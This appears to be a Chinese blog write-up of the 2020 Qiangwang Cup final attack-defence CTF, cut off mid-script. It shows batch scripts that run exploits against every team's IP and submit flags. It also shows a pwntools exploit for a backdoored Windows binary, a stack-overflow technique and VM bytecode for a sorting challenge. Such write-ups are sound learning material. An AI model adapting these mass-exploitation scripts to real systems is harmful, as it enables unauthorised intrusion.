    </entry>
    
    
    
    <entry>
      <title>强网杯_final</title>
      <link href="/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/"/>
      <url>/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="强网杯-final"><a href="#强网杯-final" class="headerlink" title="强网杯_final"></a>强网杯_final</h2><blockquote><p>没想到第一次打线下就回到了家乡河南，强网有排面！！<br> 线下赛赛制为AD(awd)和RW(real world)，real world就相当与挖掘0day，难度不言而喻，AD的话只有pwn题，占50%的分数，因此pwn采用的是只打ad的策略，最后也取得了不错的效果。</p></blockquote><span id="more"></span><h3 id="AD的赛前准备"><a href="#AD的赛前准备" class="headerlink" title="AD的赛前准备"></a>AD的赛前准备</h3><p>打AD要想获得不错的成绩，我认为最重要的就是要抢占先机。率先发现漏洞，并写出exp，往往能打得别人措手不及，因此赛前的脚本准备往往非常重要。</p><p>准备脚本一般分为两类：1.批量IP生成脚本。2.批量交flag的脚本。<br>批量IP生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">range_ = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,range_):</span><br><span class="line">t = ip.replace(<span class="string">&quot;x&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">f.write(t+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;usage: python %s ip range&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">usage:</span><br><span class="line">python ip.py <span class="number">172.168</span> <span class="number">.1</span> <span class="number">.1</span> :x <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>批量交flag脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token9013e05455d&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">适用于有curl接口的AD，若没此接口，则先抓包，写出sub_flag函数批量提交。</span><br></pre></td></tr></table></figure><h3 id="AD全程高能"><a href="#AD全程高能" class="headerlink" title="AD全程高能"></a>AD全程高能</h3><p>Pwn题一共出了4道。</p><p>win(一道windows下的栈溢出)</p><p>pd0(go写的一个框架)</p><p>sort(vm_pwn)</p><p>thrd(线程堆题)</p><p>个人认为最难的是pd0，好像只有0x300R第二天做出来了，疯狂打群场。不过我们守住了，ruan师傅在github上找到了源码，打patch改了max_size，nb!</p><p>下面依次分析：</p><h4 id="0x01-win"><a href="#0x01-win" class="headerlink" title="0x01 win"></a>0x01 win</h4><p>win是第一个放出的题目，仅过4分钟vidar-time就发起进攻，我们也瞬间反应过来这道题目有后门果然：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v43, <span class="string">&quot;vvqqccqaFEFH&quot;</span>, v45) &amp;&amp; v44 == <span class="number">12</span> ) 我patch过了已经</span><br><span class="line">      &#123;</span><br><span class="line">        v46 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v46 )</span><br><span class="line">        &#123;</span><br><span class="line">          v47 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Can&#x27;t open the flag file&quot;</span>);</span><br><span class="line">          <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v47, sub_1400062B0);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !feof(v46) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( fgets(&amp;Buf, <span class="number">128</span>, v46) )</span><br><span class="line">          &#123;</span><br><span class="line">            v48 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)&amp;Buf);  <span class="comment">//cout&lt;&lt;flag！！</span></span><br><span class="line">            <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v48, sub_1400062B0);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(v46);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>第一波脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">16957</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn_bak.bak.bak&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x000000000000107B)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[*] Rounds 1 $&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Banner hide&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;wwssadadBABA&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;wwssadadBABA ]\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># p.sendline(&quot;cat flag&quot;)</span></span><br><span class="line"><span class="comment"># p.recv(timeout=0.5)</span></span><br><span class="line">flag = p.recvuntil(<span class="string">&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br></pre></td></tr></table></figure><p>直接打到第六，但其他队也不是吃素的，patch改”wwssadadBABA”为其他字符串。</p><p>之后又有一个洞在这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sub_1400060E0(v5, (__int64)<span class="string">&quot;Please input the password: &quot;</span>);</span><br><span class="line">  sub_140007060(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;password);</span><br><span class="line">  v6 = &amp;password;</span><br><span class="line">  v7 = (<span class="type">char</span> *)password;</span><br><span class="line">  v8 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( v31 &gt;= <span class="number">16</span> )</span><br><span class="line">    v6 = password;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;Dst, v6, Size);  size为实际的password长度</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;Dst, <span class="string">&quot;I_Love_QWB&quot;</span>, <span class="number">0xA</span>ui64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Your password &quot;</span>);</span><br><span class="line">    v10 = sub_1400060E0(v9, (__int64)&amp;Dst);</span><br><span class="line">    v11 = sub_1400060E0(v10, (__int64)<span class="string">&quot; seems not true!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v11, sub_1400062B0);</span><br><span class="line">    sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Try again: &quot;</span>);</span><br><span class="line">    sub_140007060(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;password);</span><br><span class="line">    v12 = &amp;password;</span><br><span class="line">    v7 = (<span class="type">char</span> *)password;</span><br><span class="line">    v8 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v12 = password;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;Dst, v12, Size);</span><br></pre></td></tr></table></figure><p>可见，第一次输入较长的password可以泄露出stack上的地址，然后再借助第二次的try again覆盖返回地址为上面后门函数的地址即可!</p><p>patch限制size为0x30，栈溢出不了。</p><h4 id="0x02-pd0"><a href="#0x02-pd0" class="headerlink" title="0x02 pd0"></a>0x02 pd0</h4><p>源码地址：<a href="https://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go">https://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go</a></p><p>Fixing：<br>Either the padding should be removed or a handler should be modified to not leak the information, e.g. by changing the max allowed size of the generated picture.</p><h4 id="0x03-sort"><a href="#0x03-sort" class="headerlink" title="0x03 sort"></a>0x03 sort</h4><p>感觉是最有意思的一题。<br>题目意思是要完成对一个随机数组进行排序，所执行的汇编指令越少分数越高，分高的一方获胜，攻击方获胜拿flag，防守方获胜则攻击方无法拿flag.<br>同时有给出了出题人自己写的汇编指令系统，还要opcode和初赛的qwlogin一样，省去了逆opcode的时间。</p><p>opcode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HLT 0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV 0x01</span></span><br><span class="line"><span class="comment">//CALC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUB 0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MUL 0X04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV 0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 0X06</span></span><br><span class="line"><span class="comment">//BIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XOR 0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OR  0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AND 0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHL 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHR 0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NOT 0x0c</span></span><br><span class="line"><span class="comment">//STACK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP  0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH 0x0e</span></span><br><span class="line"><span class="comment">//FUNC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET  0x11</span></span><br><span class="line"><span class="comment">//JMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMP 0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP 0x13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JE  0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNE 0x15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JG  0x16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNG 0x17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JL  0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNL 0x19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JA  0x1a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNA 0x1b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JB  0x1c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNB 0x1d</span></span><br><span class="line"><span class="comment">//INT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ADDR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RR  0X00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RL  0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LR  0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RS  0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SR  0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RI  0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_  0X06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I_  0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L_  0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_  0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __  0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR  0x0b <span class="comment">//RegLoad Reg</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RP  0x0c <span class="comment">//Reg RegLoad</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QR  0x0d <span class="comment">//RegStack Reg</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RQ  0x0e <span class="comment">//Reg RegStack</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//WIDTH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE  0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WORD  0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DWORD 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIDTH(X) (X &amp; 0xf0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDR(X)  (X &amp; 0x0f)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_O(X) (X |= 0b0000000000000001)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_S(X) (X |= 0b0000000000000010)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_Z(X) (X |= 0b0000000000000100)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_C(X) (X |= 0b0000000000001000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_O(X) (X &amp;= ~(0b0000000000000001))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_S(X) (X &amp;= ~(0b0000000000000010))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_Z(X) (X &amp;= ~(0b0000000000000100))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_C(X) (X &amp;= ~(0b0000000000001000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_O(X) (X &amp; 0b0000000000000001)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_S(X) ((X &amp; 0b0000000000000010) &gt;&gt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_Z(X) ((X &amp; 0b0000000000000100) &gt;&gt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_C(X) ((X &amp; 0b0000000000001000) &gt;&gt; 3)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">SYSCALLS</span> &#123;</span></span><br><span class="line">    _SYS_OPEN = <span class="number">0</span>,</span><br><span class="line">    _SYS_READ = <span class="number">1</span>,</span><br><span class="line">    _SYS_WRITE,</span><br><span class="line">    _SYS_CLOSE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来就得手撕汇编了，我们选择了较为简单的冒泡排序，又因为没有那种直接操作内存的指令，就只能用寄存器传递，导致效率并不是很高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">14640</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># pass</span></span><br><span class="line">p = process(<span class="string">&quot;./BATTLE&quot;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x555555554000+0x00000000000EEb9 if $rdx == 0x1e&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x555555554000+0x00000000000F238&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Beat Me!&quot;</span>)</span><br><span class="line">code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># loop1:</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x15</span>) + p8(<span class="number">3</span>) + p8(<span class="number">99</span>)<span class="comment"># cmp r3,99</span></span><br><span class="line">code += p8(<span class="number">0x16</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">0x65</span>)<span class="comment"># JG exit</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">6</span>) + p8(<span class="number">3</span>)<span class="comment"># mov r6,r3</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x15</span>) + p8(<span class="number">0</span>) + p8(<span class="number">99</span>)<span class="comment"># mov r0,99</span></span><br><span class="line">code += p8(<span class="number">0x3</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">0</span>) + p8(<span class="number">6</span>)<span class="comment"># sub r0,r6</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x45</span>) + p8(<span class="number">4</span>) + p64(<span class="number">0</span>)<span class="comment"># mov r4,0</span></span><br><span class="line"><span class="comment"># loop2:</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">4</span>) + p8(<span class="number">0</span>)<span class="comment"># cmp r4,r0</span></span><br><span class="line">code += p8(<span class="number">0x14</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">0x38</span>)<span class="comment">#je update</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">5</span>) + p8(<span class="number">4</span>)<span class="comment">#mov r5,r4</span></span><br><span class="line">code += p8(<span class="number">0x4</span>)+ p8(<span class="number">0x25</span>)+ p8(<span class="number">5</span>) + p16(<span class="number">8</span>)<span class="comment"># mul r5,8</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4c</span>)+ p8(<span class="number">1</span>) + p8(<span class="number">5</span>)<span class="comment"># mov r1,mem[r5]</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">6</span>) + p8(<span class="number">5</span>)<span class="comment"># mov r6,r5</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">6</span>) + p16(<span class="number">8</span>)<span class="comment">#add r6,8</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4c</span>)+ p8(<span class="number">2</span>) + p8(<span class="number">6</span>)<span class="comment">#mov r2,mem[r6]</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">1</span>) + p8(<span class="number">2</span>)<span class="comment">#cmp r1,r2</span></span><br><span class="line">code += p8(<span class="number">0x1c</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">8</span>)<span class="comment">#jb next</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4b</span>)+ p8(<span class="number">6</span>) + p8(<span class="number">1</span>)<span class="comment">#mov 